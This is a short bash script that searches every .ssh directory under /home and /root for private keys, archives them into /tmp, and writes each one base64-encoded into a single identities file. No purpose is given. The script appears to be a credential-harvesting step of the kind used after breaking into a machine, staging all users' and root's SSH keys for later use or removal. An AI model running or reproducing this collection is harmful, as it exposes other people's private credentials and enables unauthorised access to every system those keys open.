#!/bin/bash

# collect all private keys
rm -f /tmp/ssh_keys.tar /tmp/ssh_keys.tar.gz 2>/dev/null; for f in $(find  /home /root -name .ssh | xargs -I {} find {} -type f); do if grep "PRIVATE" $f >/dev/null; then tar -C $(dirname $f) -rvf /tmp/ssh_keys.tar $f 2>/dev/null; fi done; gzip /tmp/ssh_keys.tar

# create base64 list of private keys
rm -rf /tmp/ssh_keys; mkdir /tmp/ssh_keys; tar -zxvf /tmp/ssh_keys.tar.gz -C "/tmp/ssh_keys"; cd /tmp/ssh_keys; truncate -s0 /tmp/identities.txt; for k in $(find /tmp/ssh_keys -type f); do cat $k | base64 -w0 >> /tmp/identities.txt; done